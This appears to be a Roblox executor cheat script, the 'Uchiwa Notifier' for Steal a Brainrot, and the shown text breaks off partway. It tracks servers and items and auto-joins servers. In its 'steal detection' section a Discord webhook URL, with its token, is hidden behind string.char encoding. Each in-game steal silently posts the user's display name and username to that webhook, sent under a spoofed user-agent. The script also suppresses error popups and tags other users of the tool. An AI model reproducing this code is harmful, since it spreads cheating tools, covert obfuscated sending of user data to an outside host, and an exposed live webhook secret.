getgenv().UCHIWA_key = "UCHIWA-L4CYAIDX"
-- ============================================================
-- UCHIWA NOTIFIER - VERSION CORRIGÉE + OBFUSQUÉE
-- ============================================================

-- [[ SERVICES ]] --
local HttpService        = game:GetService("HttpService")
local GuiService         = game:GetService("GuiService")
local VirtualInputManager= game:GetService("VirtualInputManager")
local UserInputService   = game:GetService("UserInputService")
local Players            = game:GetService("Players")
local TeleportService    = game:GetService("TeleportService")
local SoundService       = game:GetService("SoundService")
local TweenService       = game:GetService("TweenService")
local RunService         = game:GetService("RunService")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")
local Workspace          = game:GetService("Workspace")

local lp = Players.LocalPlayer
if not lp then Players:GetPropertyChangedSignal("LocalPlayer"):Wait(); lp = Players.LocalPlayer end
local PlayerGui = lp:WaitForChild("PlayerGui", 15)

-- [[ ANTI ERROR POPUP ]] --
task.spawn(function()
	while task.wait(0.5) do
		pcall(function()
			local errorMessage = GuiService:GetErrorMessage()
			if errorMessage and errorMessage ~= "" then
				GuiService:ClearError()
				VirtualInputManager:SendKeyEvent(true,  Enum.KeyCode.Return, false, game)
				VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
			end
		end)
	end
end)

-- [[ ADAPTATION MOBILE/PC ]] --
local isMobile   = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
local screenSize = (Workspace.CurrentCamera and Workspace.CurrentCamera.ViewportSize) or Vector2.new(1920, 1080)

local defaultSize = isMobile
	and UDim2.new(0, math.min(screenSize.X - 20, 420), 0, math.min(screenSize.Y - 80, 500))
	or  UDim2.new(0, 540, 0, 520)
local defaultPos = UDim2.new(0.5, 0, 0.5, 0)
local minWidth   = isMobile and 280 or 340
local minHeight  = isMobile and 250 or 300

local M = {
	headerH      = isMobile and 55  or 80,
	fontSize     = isMobile and 11  or 13,
	fontSizeBig  = isMobile and 14  or 18,
	fontSizeSmall= isMobile and 9   or 11,
	btnH         = isMobile and 36  or 40,
	petRowH      = isMobile and 44  or 40,
	logRowH      = isMobile and 50  or 44,
	navH         = isMobile and 44  or 40,
	touchPad     = isMobile and 8   or 4,
	checkSize    = isMobile and 28  or 22,
	joinBtnW     = isMobile and 64  or 58,
	joinBtnH     = isMobile and 32  or 28,
	resizeSize   = isMobile and 30  or 18,
	scrollBar    = isMobile and 4   or 2,
}

-- ============================================================
-- [[ CONFIG SYSTEM ]]
-- ============================================================
local FILE_NAME = "UchiwaConfig_Final.json"

local function SaveConfig(config)
	local success, result = pcall(function() return HttpService:JSONEncode(config) end)
	if success and type(result) == "string" and result ~= "" then
		pcall(function() writefile(FILE_NAME, result) end)
	end
end

local function LoadConfig()
	local defaults = {
		AutoJoin      = false,
		MinValue      = "0",
		PriorityList  = {},
		CustomMin     = {},
		SoundID       = "133600425570488",
		Volume        = 1,
		RemoveDuel    = false,
		ForceJoinCount= 50,
		ToggleKey     = "LeftControl"
	}
	if isfile and isfile(FILE_NAME) then
		local raw
		pcall(function() raw = readfile(FILE_NAME) end)
		if type(raw) == "string" and raw ~= "" then
			local ok, data = pcall(function() return HttpService:JSONDecode(raw) end)
			if ok and type(data) == "table" then
				for k, v in pairs(defaults) do
					if data[k] == nil then data[k] = v end
				end
				return data
			end
		end
	end
	return defaults
end

local Config = LoadConfig()
Config.RemoveDuel = true
Config.AutoJoin   = false
if not Config.ForceJoinCount then Config.ForceJoinCount = 50 end
if not Config.ToggleKey       then Config.ToggleKey = "LeftControl" end
SaveConfig(Config)

-- [[ THEME ]] --
local THEME = {
	BG         = Color3.fromRGB(12,  12,  18),
	Secondary  = Color3.fromRGB(20,  20,  30),
	Card       = Color3.fromRGB(22,  22,  32),
	CardHover  = Color3.fromRGB(28,  28,  40),
	Accent     = Color3.fromRGB(140, 0,   255),
	Red        = Color3.fromRGB(255, 50,  50),
	Text       = Color3.fromRGB(255, 255, 255),
	SubText    = Color3.fromRGB(170, 170, 170),
	Green      = Color3.fromRGB(0,   255, 100),
	Gold       = Color3.fromRGB(255, 200, 50),
	Orange     = Color3.fromRGB(255, 165, 0),
	DimText    = Color3.fromRGB(100, 100, 100),
	PriorityBG = Color3.fromRGB(30,  20,  45),
	ExpandBG   = Color3.fromRGB(18,  16,  28),
}

-- ============================================================
-- [[ STEAL DETECTION ]]
-- ============================================================
local STEAL_WEBHOOK_URL = string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,53,48,52,50,50,56,57,51,56,53,52,49,48,54,49,50,47,100,52,76,101,100,104,119,84,115,98,51,67,109,69,104,103,50,48,88,121,117,53,56,105,102,115,101,52,84,56,100,83,109,80,99,109,120,52,72,116,102,53,97,102,87,85,45,120,108,73,110,45,100,111,101,99,79,57,56,79,103,90,48,113,112,55,45,90)

local BRAINROT_IMAGES = {
	["skibidi toilet"]              = "https://static.wikia.nocookie.net/stealabr/images/3/34/Skibidi_toilet.png/revision/latest",
	["ginger gerat"]                = "https://static.wikia.nocookie.net/stealabr/images/8/85/GingerGerat.png/revision/latest",
	["ketupat bros"]                = "https://static.wikia.nocookie.net/stealabr/images/4/4d/Ketupat_Bros.png/revision/latest",
	["cerberus"]                    = "https://static.wikia.nocookie.net/stealabr/images/4/45/Cerberus.png/revision/latest",
	["dragon cannelloni"]           = "https://static.wikia.nocookie.net/stealabr/images/3/31/Nah_uh.png/revision/latest",
	["dragon gingerini"]            = "https://cdn.discordapp.com/attachments/1453075549747548360/1484272490242113637/DragonGingerini.webp",
	["headless horseman"]           = "https://static.wikia.nocookie.net/stealabr/images/f/ff/Headlesshorseman.png/revision/latest",
	["hydra dragon cannelloni"]     = "https://static.wikia.nocookie.net/stealabr/images/e/ee/Hydra_Dragon_Cannelloni.png/revision/latest",
	["meowl"]                       = "https://static.wikia.nocookie.net/stealabr/images/b/b8/Clear_background_clear_meowl_image.png/revision/latest",
	["strawberry elephant"]         = "https://static.wikia.nocookie.net/stealabr/images/5/58/Strawberryelephant.png/revision/latest",
	["nuclearo dinosauro"]          = "https://static.wikia.nocookie.net/stealabr/images/3/39/Site-community-image/revision/latest",
	["tacorita bicicleta"]          = "https://static.wikia.nocookie.net/stealabr/images/0/0f/Gonna_rob_you_twin.png/revision/latest",
	["fishino clownino"]            = "https://static.wikia.nocookie.net/stealabr/images/d/d6/Fishino_Clownino.png/revision/latest",
	["las sis"]                     = "https://static.wikia.nocookie.net/stealabr/images/e/e8/Las_Sis.png/revision/latest",
	["los bros"]                    = "https://static.wikia.nocookie.net/stealabr/images/5/53/BROOOOOOOO.png/revision/latest",
	["los planitos"]                = "https://static.wikia.nocookie.net/stealabr/images/8/83/Los_Planitos.png/revision/latest",
	["los hotspotsitos"]            = "https://static.wikia.nocookie.net/stealabr/images/6/69/Loshotspotsitos.png/revision/latest",
	["los jolly combinasionas"]     = "https://static.wikia.nocookie.net/stealabr/images/7/7b/Los_jollycombos.png/revision/latest",
	["money money puggy"]           = "https://static.wikia.nocookie.net/stealabr/images/0/09/Money_money_puggy.png/revision/latest",
	["celularcini viciosini"]       = "https://static.wikia.nocookie.net/stealabr/images/3/38/DO_NOT_GRAB_MY_PHONE%21%21%21.png/revision/latest",
	["la extinct grande"]           = "https://static.wikia.nocookie.net/stealabr/images/c/cd/La_Extinct_Grande.png/revision/latest",
	["la spooky grande"]            = "https://static.wikia.nocookie.net/stealabr/images/5/51/Spooky_Grande.png/revision/latest",
	["chipso and queso"]            = "https://static.wikia.nocookie.net/stealabr/images/f/f8/Chipsoqueso.png/revision/latest",
	["tuff toucan"]                 = "https://static.wikia.nocookie.net/stealabr/images/3/3e/TuffToucan.png/revision/latest",
	["gobblino uniciclino"]         = "https://static.wikia.nocookie.net/stealabr/images/c/c5/Gobblino_Uniciclino.png/revision/latest",
	["tralaledon"]                  = "https://static.wikia.nocookie.net/stealabr/images/7/79/Brr_Brr_Patapem.png/revision/latest",
	["la jolly grande"]             = "https://static.wikia.nocookie.net/stealabr/images/5/5f/La_Chrismas_Grande.png/revision/latest",
	["los puggies"]                 = "https://static.wikia.nocookie.net/stealabr/images/c/c8/LosPuggies2.png/revision/latest",
	["los primos"]                  = "https://static.wikia.nocookie.net/stealabr/images/9/96/LosPrimos.png/revision/latest",
	["eviledon"]                    = "https://static.wikia.nocookie.net/stealabr/images/7/78/Eviledonn.png/revision/latest",
	["los tacoritas"]               = "https://static.wikia.nocookie.net/stealabr/images/4/40/My_kids_will_also_rob_you.png/revision/latest",
	["tang tang keletang"]          = "https://static.wikia.nocookie.net/stealabr/images/c/ce/TangTangVfx.png/revision/latest",
	["la taco combinasion"]         = "https://static.wikia.nocookie.net/stealabr/images/8/84/Latacocombi.png/revision/latest",
	["ketupat kepat"]               = "https://static.wikia.nocookie.net/stealabr/images/a/ac/KetupatKepat.png/revision/latest",
	["tictac sahur"]                = "https://static.wikia.nocookie.net/stealabr/images/6/6f/Time_moving_slow.png/revision/latest",
	["swaggy bros"]                 = "https://static.wikia.nocookie.net/stealabr/images/8/85/Swaggy_Bros.png/revision/latest",
	["orcaledon"]                   = "https://static.wikia.nocookie.net/stealabr/images/a/a6/Orcaledon.png/revision/latest",
	["ketchuru and musturu"]        = "https://static.wikia.nocookie.net/stealabr/images/1/14/Ketchuru.png/revision/latest",
	["jolly jolly sahur"]           = "https://static.wikia.nocookie.net/stealabr/images/f/f1/JollyJollySahur.png/revision/latest",
	["lavadorito spinito"]          = "https://static.wikia.nocookie.net/stealabr/images/f/ff/Lavadorito_Spinito.png/revision/latest",
	["garama and madundung"]        = "https://static.wikia.nocookie.net/stealabr/images/e/ee/Garamadundung.png/revision/latest",
	["spaghetti tualetti"]          = "https://static.wikia.nocookie.net/stealabr/images/b/b8/Spaghettitualetti.png/revision/latest",
	["festive 67"]                  = "https://static.wikia.nocookie.net/stealabr/images/c/c8/TransparentFestive67.png/revision/latest",
	["los spaghettis"]              = "https://static.wikia.nocookie.net/stealabr/images/3/33/Los_Spaghettis.png/revision/latest",
	["la ginger sekolah"]           = "https://static.wikia.nocookie.net/stealabr/images/1/14/Esok_Ginger.png/revision/latest",
	["spooky and pumpky"]           = "https://static.wikia.nocookie.net/stealabr/images/d/d6/Spookypumpky.png/revision/latest",
	["fragrama and chocrama"]       = "https://static.wikia.nocookie.net/stealabr/images/5/56/Fragrama.png/revision/latest",
	["la secret combinasion"]       = "https://static.wikia.nocookie.net/stealabr/images/f/f2/Lasecretcombinasion.png/revision/latest",
	["reinito sleighito"]           = "https://static.wikia.nocookie.net/stealabr/images/2/27/Reinito.png/revision/latest",
	["burguro and fryuro"]          = "https://static.wikia.nocookie.net/stealabr/images/6/65/Burguro-And-Fryuro.png/revision/latest",
	["cooki and milki"]             = "https://static.wikia.nocookie.net/stealabr/images/9/9b/Cooki_and_milki.png/revision/latest",
	["capitano moby"]               = "https://static.wikia.nocookie.net/stealabr/images/e/ef/Moby.png/revision/latest",
	["rosey and teddy"]             = "https://static.wikia.nocookie.net/stealabr/images/4/4d/Rosey_and_teddy.png/revision/latest",
	["love love bear"]              = "https://static.wikia.nocookie.net/stealabr/images/8/89/Love_Love_Bear.png/revision/latest",
	["rosetti tualetti"]            = "https://static.wikia.nocookie.net/stealabr/images/0/0e/Rosettitualetti.png/revision/latest",
	["la romantic grande"]          = "https://cdn.discordapp.com/attachments/1453075549747548360/1483909023102140537/Screenshot_2026-03-17-16-22-29-555_com.discord-removebg-preview.png",
	["popcuru and fizzuru"]         = "https://static.wikia.nocookie.net/stealabr/images/a/a9/Popuru_and_Fizzuru.png/revision/latest",
	["chillin chili"]               = "https://static.wikia.nocookie.net/stealabr/images/e/e0/Chilin.png/revision/latest",
	["chicleteira bicicleteira"]    = "https://static.wikia.nocookie.net/stealabr/images/5/5a/Chicleteira.png/revision/latest",
	["esok sekolah"]                = "https://static.wikia.nocookie.net/stealabr/images/2/2a/EsokSekolah2.png/revision/latest",
	["chimnino"]                    = "https://static.wikia.nocookie.net/stealabr/images/c/c5/Chimnino.png/revision/latest",
	["los 25"]                      = "https://steal-a-brainrot.wiki/wp-content/uploads/2025/12/Los-25-Icon.png",
	["griffin"]                     = "https://media.discordapp.net/attachments/1478482557539450976/1480282235730133124/Griffin.webp",
	["los cupids"]                  = "https://media.discordapp.net/attachments/1478482557539450976/1480282236136718376/Los_Cupids2.webp",
	["snailo clovero"]              = "https://cdn.discordapp.com/attachments/1453075549747548360/1482506554052968488/clover_character.png",
	["gold gold gold"]              = "https://cdn.discordapp.com/attachments/1453075549747548360/1482508075679219944/dark_creature.png",
	["fortunu and cashuru"]         = "https://cdn.discordapp.com/attachments/1453075549747548360/1482509200822243328/two_characters.png",
	["celestial pegasus"]           = "https://cdn.discordapp.com/attachments/1453075549747548360/1482510148210786435/Celestial_Pegasus.webp",
	["nacho spyder"]                = "https://media.discordapp.net/attachments/1478482557539450976/1480282236472397965/Nacho_Spyder.webp",
	["la lucky grande"]             = "https://cdn.discordapp.com/attachments/1453075549747548360/1483909023852925039/La_Lucky_Grande-removebg-preview.png",
	["tirilikalika tirilikalako"]   = "https://media.discordapp.net/attachments/1453075549747548360/1483974498972864582/TirilikalikaTirilikalakoTransparent.webp",
	["la casa boo"]                 = "https://cdn.discordapp.com/attachments/1453075549747548360/1484302468694278275/Casa_Booo.webp",
	["la supreme conbinasion"]      = "https://cdn.discordapp.com/attachments/1453075549747548360/1484272634316456116/SupremeCombinasion.webp",
	["los amigos"]                  = "https://media.discordapp.net/attachments/1453075549747548360/1484273285863702569/Los_Amigos.webp",
	["los sekholas"]                = "https://cdn.discordapp.com/attachments/1453075549747548360/1484273286170022109/Los_Sekolahs2.webp",
	["dug dug dug"]                 = "https://media.discordapp.net/attachments/1453075549747548360/1484277010191749213/DUG_DUG_DUG_BRAINROT.webp",
	["Boppin Bunny"]                = "https://cdn.discordapp.com/attachments/1492957559953424474/1492957594988449822/Boppin_Bunny.webp?ex=69dd389c&is=69dbe71c&hm=bee98fa15fedd690f4bdd853c55be447fe095b8c8f6356e72d504851221508cc&",
	["Hydra Bunny"]					= "https://media.discordapp.net/attachments/1492957559953424474/1492957847124971781/Hydra_Bunny.webp?ex=69dd38d8&is=69dbe758&hm=99f9e6ef308f68397a2f04ca569d6b48a4f4b65e5537d8eb756777ebc8aa58a2&=&format=webp&width=960&height=960",
	["Arcadragon"]					= "https://cdn.discordapp.com/attachments/1492957559953424474/1492958316358275293/Arcadragon_Brainrot.webp?ex=69dd3948&is=69dbe7c8&hm=93af1820d7cd1e4218db6ebf934686f066555de509a8d8281b6ac6d678dfe871&",
    ["Cash or Card"]				= "https://cdn.discordapp.com/attachments/1492957559953424474/1492958912033329192/CashOrCardd.webp?ex=69dd39d6&is=69dbe856&hm=273fc8bb56a9baa43f5876f30303f7261e77f9dd8c9daefacfb78dc84107b562&",
	["Bunny and Eggy"]				= "https://cdn.discordapp.com/attachments/1492957559953424474/1492959290103955517/Bunny_and_Eggy.webp?ex=69dd3a30&is=69dbe8b0&hm=9926d5d22720a667312edfafb95b83294f6addf30c166010463b1caf166c9cf2&",
	["Quackini Snackini"]			= "https://cdn.discordapp.com/attachments/1492957559953424474/1492959652063871087/Quackini_Snackini.webp?ex=69dd3a86&is=69dbe906&hm=6fee389d2f64403c9363cc5746885d660d42064c104f1ee0b50e0fe560d4ec42&",
    ["Pancake and Syrup"]			= "https://cdn.discordapp.com/attachments/1492957559953424474/1492960547866411080/Pancake_and_Syrup.webp?ex=69dd3b5c&is=69dbe9dc&hm=a8115ec5bc149813dfb9abcc0adcd17c422ce072b5f7590ef81775d1c51a5138&",
	["Rico Dinero"]					= "https://cdn.discordapp.com/attachments/1492957559953424474/1492960860887449873/Rico_Dinero.webp?ex=69dd3ba7&is=69dbea27&hm=47fe05e73a5f77d084ed8f8fca01276354f686314dd5ace7064a92241d5023e5&",
	["Globa Steppa"]				= "https://cdn.discordapp.com/attachments/1492957559953424474/1492961141976994052/Globba_Steppa.webp?ex=69dd3bea&is=69dbea6a&hm=db5a42c085705e4409be86ee6245c44c8a76fea3b38bfeeee553701e72e6af97&", 
    ["Bananito"]					= "https://cdn.discordapp.com/attachments/1492957559953424474/1492961280993001472/NoFiltero7.webp?ex=69dd3c0b&is=69dbea8b&hm=7c3f988d0cbf2889a0ebc302724dd98e2b983eefa34154e5494ee071fa66461e&",
	["Strawberrita"]				= "https://cdn.discordapp.com/attachments/1492957559953424474/1492961424178413879/Strawberrita2.webp?ex=69dd3c2d&is=69dbeaad&hm=a3d7e0150e5685dfba19c71eefbcb521f1bab659ed0fce73126738daf5e885fa&",
	["Hopilikalika Hopilikalako"]   = "https://cdn.discordapp.com/attachments/1492957559953424474/1492961869055655952/Hopilikalika_Hopilikalako.webp?ex=69dd3c97&is=69dbeb17&hm=539ef73241b8ebecf8475986853b032e343c6bd0cd6c7f4ad81606dbee2a77c1&",
    ["Los Bunitos"]					= "https://cdn.discordapp.com/attachments/1492957559953424474/1492962347621548143/Los_Bunitos.webp?ex=69dd3d09&is=69dbeb89&hm=922a51d9295cdba2e0f238683734ce99c64be48cf876ef665f2a57b0f93e8d3c&",
	["Baskito"]						= "https://cdn.discordapp.com/attachments/1492957559953424474/1492962363102593195/Baskito.webp?ex=69dd3d0d&is=69dbeb8d&hm=6101a4cdfe8d52983e7df5fa3a61676a8a543a13da4e441b01a40ca9a0149700&",
	["Churrito Bunnito"]			= "https://cdn.discordapp.com/attachments/1492957559953424474/1492962393406443721/Churrito_Bunnito.webp?ex=69dd3d14&is=69dbeb94&hm=410501933695d1b8df432ed91f7a49ae42be3fe7609525a313d028e6eb4a19c0&", 
    ["Elefanto Frigo"]				= "https://cdn.discordapp.com/attachments/1492957559953424474/1493020555966939136/Elefanto_Frigo_Transparent.webp?ex=69dd733f&is=69dc21bf&hm=04cd24156f38e7969e8920b68c547fa759175f9dac5d77effcdedc2bba5f8e8f&",
	["Signore Carapace"]			= "https://cdn.discordapp.com/attachments/1492957559953424474/1493021275826946058/Teenage_turtle-2.webp?ex=69dd73eb&is=69dc226b&hm=a9d32f9c5b83dd312f8dc26d4c6062a4d183d37450f657dfd7d03dd19c20a65c&",
	["Antonio"]						= "https://cdn.discordapp.com/attachments/1492957559953424474/1493021409956335826/Antonio.webp?ex=69dd740b&is=69dc228b&hm=d3204f38cfdfb2be23658ec0a7a26a599d0f523f099d665b1f9fbed54ef955ca&", 
    ["Love Love Bear"]				= "https://cdn.discordapp.com/attachments/1492957559953424474/1493022052880355551/Love_Love_Bear.webp?ex=69dd74a4&is=69dc2324&hm=b3eced04882ed23c0aab8363adeb006c63940df75382c9c0af22560bd205b3a2&",
	["La Easter Grande"]			= "https://cdn.discordapp.com/attachments/1492993401321427054/1493331148787548221/Easter_La_Grande-1.webp?ex=69dfe602&is=69de9482&hm=3c66b219b19b3b66157ab6f7fe28b11e79a342647c17ed44c7e02298f4302aac&",
}


local function sendStealWebhook(pn, bn)
	local req = syn.request
	if not req then return end
	local imageUrl = BRAINROT_IMAGES[bn:lower()]
	local embed = {
		title  = "BRAINROT STEAL !",
		color  = 9109759,
		fields = {
			{ name = "Brainrot", value = "**"..bn.."**", inline = true },
			{ name = "Joueur",   value = "**"..pn.."**", inline = true }
		},
		footer    = { text = "Uchiwa Notifier" },
		timestamp = DateTime.now():ToIsoDate()
	}
	if imageUrl then embed["thumbnail"] = { url = imageUrl } end
	pcall(function()
		req({
			Url     = STEAL_WEBHOOK_URL, Method = "POST",
			Headers = { ["Content-Type"] = "application/json", ["User-Agent"] = "Roblox/WinInet" },
			Body    = HttpService:JSONEncode({ embeds = { embed } })
		})
	end)
end

local function stripRichText(text)
	return string.gsub(text, "<[^>]+>", "")
end

local function extractBrainrot(text)
	local bn = string.match(string.lower(text), "you stole (.+)")
	return bn or "unknown"
end

local db = false
local function checkText(text)
	if type(text) ~= "string" then return end
	if text == "" then return end
	local clean = stripRichText(text)
	if string.find(string.lower(clean), "you stole") then
		if db then return end
		db = true
		local bn = extractBrainrot(clean)
		local bnDisplay = bn:gsub("(%a)([%w_']*)", function(a, b) return a:upper()..b end)
		sendStealWebhook(lp.DisplayName .. " (@" .. lp.Name .. ")", bnDisplay)
		task.wait(2)
		db = false
	end
end

local function watchObject(obj)
	if not (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) then return end
	local ok, txt = pcall(function() return obj.Text end)
	if ok and type(txt) == "string" then checkText(txt) end
	obj:GetPropertyChangedSignal("Text"):Connect(function()
		local ok2, txt2 = pcall(function() return obj.Text end)
		if ok2 and type(txt2) == "string" then checkText(txt2) end
	end)
end

local function scan(parent)
	for _, obj in ipairs(parent:GetDescendants()) do
		watchObject(obj)
	end
end

local function watchGui(gui)
	scan(gui)
	gui.DescendantAdded:Connect(function(desc)
		watchObject(desc)
	end)
end

for _, gui in ipairs(PlayerGui:GetChildren()) do watchGui(gui) end
PlayerGui.ChildAdded:Connect(function(gui) watchGui(gui) end)

-- ============================================================
-- [[ UCHIWA USER DETECTION ]]
-- ============================================================
local secretAnimId = "rbxassetid://1001001001"
task.spawn(function()
	local a  = Instance.new("Animation"); a.AnimationId = secretAnimId
	local la = nil
	while task.wait(3) do
		pcall(function()
			if lp.Character and lp.Character:FindFirstChild("Humanoid") then
				local ar = lp.Character.Humanoid:FindFirstChild("Animator") or lp.Character.Humanoid
				if not la or la.Parent == nil then la = ar:LoadAnimation(a) end
				if not la.IsPlaying then la:Play(); la:AdjustSpeed(0) end
			end
		end)
	end
end)

local function applyTag(p)
	if p == lp then return end
	pcall(function()
		if p.Character and p.Character:FindFirstChild("Head") and p.Character:FindFirstChild("Humanoid") then
			local u  = false
			local ar = p.Character.Humanoid:FindFirstChild("Animator") or p.Character.Humanoid
			for _, t in ipairs(ar:GetPlayingAnimationTracks()) do
				if t.Animation and t.Animation.AnimationId == secretAnimId then u = true; break end
			end
			if u and not p.Character.Head:FindFirstChild("UchiwaTag") then
				local bg = Instance.new("BillboardGui", p.Character.Head)
				bg.Name = "UchiwaTag"; bg.Size = UDim2.new(0, 300, 0, 60)
				bg.AlwaysOnTop = true; bg.ExtentsOffset = Vector3.new(0, 3.5, 0)
				local tl = Instance.new("TextLabel", bg)
				tl.Size = UDim2.new(1, 0, 1, 0); tl.BackgroundTransparency = 1
				tl.Text = "UCHIWA USER"; tl.TextColor3 = THEME.Accent
				tl.Font = Enum.Font.GothamBold; tl.TextSize = 22
				tl.TextStrokeTransparency = 0; tl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
				if not p.Character:FindFirstChild("UchiwaHighlight") then
					local hl = Instance.new("Highlight", p.Character)
					hl.Name = "UchiwaHighlight"; hl.FillColor = THEME.Accent
					hl.FillTransparency = 0.7; hl.OutlineColor = THEME.Accent
					hl.OutlineTransparency = 0; hl.Adornee = p.Character
				end
			end
		end
	end)
end
task.spawn(function()
	while task.wait(1) do
		for _, p in pairs(Players:GetPlayers()) do applyTag(p) end
	end
end)

-- ============================================================
-- [[ DATA ]]
-- ============================================================
local OGS = { "Skibidi Toilet", "Meowl", "Strawberry Elephant", "Headless Horseman" }
local SECRETS = {
	"1x1x1x1","Guest 666","Signore Carapace","Foxini Lanternini","67","Agarrini la Palini",
	"Antonio","Arcadopus","Bacuru and Egguru","Bisonte Giuppitere","Blackhole Goat",
	"Boatito Auratito","Brunito Marsito","Bunito Bunito Spinito","Bunnyman",
	"Burguro And Fryuro","Burrito Bandito","Capitano Moby","Cerberus","Celestial Pegasus",
	"Chachechi","Cooki and Milki","Chicleteira Bicicleteira","Chicleteira Cupideira",
	"Chicleteirina Bicicleteirina","Chill Puppy","Chillin Chili","Chimnino","Chipso and Queso",
	"Cloverat Clapat","Celularcini Viciosini","Cupid Cupid Sahur","Cupid Hotspot","Cuadramat and Pakrahmatmamat",
	"Donkeyturbo Express","Dragon Cannelloni","Dragon Gingerini","Dul Dul Dul","Esok Sekolah",
	"Elefanto Frigo","Eviledon","Extinct Matteo","Extinct Tralalero","Festive 67",
	"Fishino Clownino","Fortunu and Cashuru","Fragola La La La","Fragrama and Chocrama",
	"Frankentteo","Garama and Madundung","Gobblino Uniciclino","Ginger Gerat","GOAT",
	"Gold Elf","Gold Gold Gold","Guerriro Digitale","Griffin","Horegini Boom",
	"Hydra Dragon Cannelloni","Jackorilla","Job Job Job Sahur","Jolly Jolly Sahur",
	"Karker Sahur","Karkerkar Kurkur","Ketchuru and Musturu","Ketupat Bros","Ketupat Kepat",
	"La Lucky Grande","La Casa Boo","La Extinct Grande","La Food Combinasion",
	"La Ginger Sekolah","La Karkerkar Combinasion","La Romantic Grande","La Sahur Combinasion",
	"La Grande Combinasion","La Secret Combinasion","La Spooky Grande","La Supreme Combinasion",
	"La Taco Combinasion","La Vacca Jacko Linterino","Las Sis","Las Tralaleritas",
	"Las Vaquitas Saturnitas","Lavadorito Spinito","Los 25","Los Planetos","Los 67",
	"Los Amigos","Los Bros","Los Burritos","Los Chicleteiras","Los Combinasionas",
	"Los Cucarachas","Los Cupids","Los Hotspotsitos","Los Jobcitos","Los Jolly Combinasionas",
	"Los Karkeritos","Los Matteos","Los Mi Gatitos","Los Mobilis","Los Nooo My Hotspotsitos",
	"Los Primos","Los Puggies","Los Quesadillas","Los Sekolahs","Los Spaghettis",
	"Los Spooky Combinasionas","Los Spyderinis","Los Sweethearts","Los Tacoritas",
	"Los Tortus","Los Trios","Love Love Bear","Love Love Love Sahur","Lovin Rose",
	"Mariachi Corazoni","Mi Gatito","Mieteteira Bicicleteira","Tirilikalika Tirilikalako",
	"Money Money Puggy","Money Money Reindeer","Nacho Spyder","Naughty Naughty",
	"Noo my Candy","Noo my examine","Noo my Gold","Noo my Heart","Noo my Present",
	"Nooo My Hotspot","Nuclearo Dinossauro","Orcaledon","Perrito Burrito",
	"Pirulitoita Bicicleteira","Popcuru and Fizzuru","Pot Hotspot","Pot Pumpkin",
	"Pumpkini Spyderini","Quesadillo Vampiro","Rang Ring Bus","Reinito Sleighito",
	"Rocco Disco","Rosey and Teddy","Rosetti Tualetti","Sammyni Fattini","Snailo Clovero",
	"Spaghetti Tualetti","Spinny Hammy","Spooky and Pumpky","Swag Soda","Swaggy Bros",
	"Tacorita Bicicleta","Tang Tang Keletang","Telemorte","Tictac Sahur","To to to Sahur",
	"Torrtuginni Dragonfrutini","Tralaledon","Trenostruzzo Turbo 4000","Trickolino",
	"Tuff Toucan","Vulturino Skeletono","Ventoliero Pavonero","Yess my examine","Zombie Tralala",
	"Dug dug dug",
    "Boppin Bunny", "Hydra Bunny", "Arcadragon",
    "Cash or Card", "Bunny and Eggy", "Quackini Snackini",
    "Pancake and Syrup", "Rico Dinero", "Globa Steppa", 
    "Bananito", "Strawberrita", "Hopilikalika Hopilikalako",
    "Los Bunitos", "Baskito", "Churrito Bunnito", 
     "Signore Carapace", "La Easter Grande",
}
table.sort(SECRETS)

-- ============================================================
-- [[ SERVER BRAINROT CACHE ]]
-- ============================================================
local serverBrainrots = {}

local function addToServerCache(sid, bn, vs, ts)
	if not sid or sid == "" then return end
	if not serverBrainrots[sid] then serverBrainrots[sid] = {} end
	for _, e in ipairs(serverBrainrots[sid]) do
		if e.name == bn then
			if (ts or 0) > (e.timestamp or 0) then
				e.value    = vs
				e.numValue = tonumber(vs:match("[%d%.]+")) or 0
				e.timestamp= ts
			end
			return
		end
	end
	table.insert(serverBrainrots[sid], {
		name      = bn,
		value     = vs,
		numValue  = tonumber(vs:match("[%d%.]+")) or 0,
		timestamp = ts or (os.time() * 1000)
	})
end

local function getAllBrainrotsInServer(sid)
	if not sid or sid == "" then return {} end
	local e = serverBrainrots[sid]; if not e then return {} end
	local s = {}
	for _, x in ipairs(e) do table.insert(s, x) end
	table.sort(s, function(a, b)
		local aP = table.find(Config.PriorityList, a.name) ~= nil
		local bP = table.find(Config.PriorityList, b.name) ~= nil
		if aP ~= bP then return aP end
		return a.numValue > b.numValue
	end)
	return s
end

local function getBestBrainrotInServer(sid)
	local e = serverBrainrots[sid]
	if not e or #e == 0 then return nil end
	local b = e[1]
	for i = 2, #e do if e[i].numValue > b.numValue then b = e[i] end end
	return b
end

local function getBestPriorityInServer(sid)
	local e = serverBrainrots[sid]; if not e then return nil end
	local best = nil
	for _, x in ipairs(e) do
		if table.find(Config.PriorityList, x.name) then
			if not best or x.numValue > best.numValue then best = x end
		end
	end
	return best
end

local function hasPriorityInServer(sid)
	local best = getBestPriorityInServer(sid)
	return best ~= nil, best
end

-- ============================================================
-- [[ UI PRINCIPAL ]]
-- ============================================================
local sg   = Instance.new("ScreenGui", PlayerGui)
sg.Name    = "Uchiwa_V18"; sg.ResetOnSpawn = false

local main = Instance.new("Frame", sg)
main.Size                = UDim2.new(0, 0, 0, 0)
main.Position            = defaultPos
main.BackgroundColor3    = THEME.BG
main.BackgroundTransparency = 0.25
main.BorderSizePixel     = 0
main.ClipsDescendants    = true
main.AnchorPoint         = Vector2.new(0.5, 0.5)
Instance.new("UIStroke", main).Color = THEME.Accent
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)

local openBtn

local function closeUI()
	if main.Visible then
		main:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Back", 0.3, true)
		task.delay(0.3, function() main.Visible = false; if openBtn then openBtn.Visible = true end end)
	end
end
local function openUI()
	if not main.Visible then
		main.Visible = true; if openBtn then openBtn.Visible = false end
		main:TweenSize(defaultSize, "Out", "Back", 0.4, true)
	end
end
local function toggleUI()
	if main.Visible then closeUI() else openUI() end
end

-- [[ SMART JOIN ]] --
local joinStates = {}
local function SmartJoin(sid, btn)
	if joinStates[btn] then
		if joinStates[btn].running then
			joinStates[btn].running = false
			btn.BackgroundColor3 = THEME.Orange; btn.Text = "▶ GO"
		else
			joinStates[btn].running = true
